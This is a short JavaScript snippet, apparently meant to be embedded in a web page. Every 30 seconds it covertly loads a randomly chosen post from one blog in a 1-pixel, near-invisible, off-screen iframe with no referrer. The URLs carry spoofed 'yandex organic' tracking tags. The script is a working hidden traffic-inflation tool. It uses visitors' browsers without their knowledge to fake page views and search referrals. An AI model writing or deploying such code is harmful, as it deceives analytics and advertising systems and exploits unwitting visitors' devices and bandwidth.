  const urls = [
    "https://www.nobleway.online/2025/03/blog-post.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.nobleway.online/2025/03/blog-post_11.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.nobleway.online/2025/03/blog-post_49.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.nobleway.online/2025/03/xxi.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.nobleway.online/2025/03/blog-post_19.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.nobleway.online/2025/03/blog-post_55.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.nobleway.online/2025/03/blog-post_0.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.nobleway.online/2025/03/blog-post_18.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.nobleway.online/2025/03/blog-post_1.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.nobleway.online/2025/03/blog-post_90.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo"
  ];

  function loadIframe() {
    const page = urls[Math.floor(Math.random() * urls.length)];
    const iframe = document.createElement("iframe");
    iframe.src = page;
    iframe.style = "width:1px; height:1px; opacity:0.01; position:absolute; left:-9999px;";
    iframe.referrerPolicy = "no-referrer";
    document.body.appendChild(iframe);
  }

  loadIframe();
  setInterval(loadIframe, 30000);
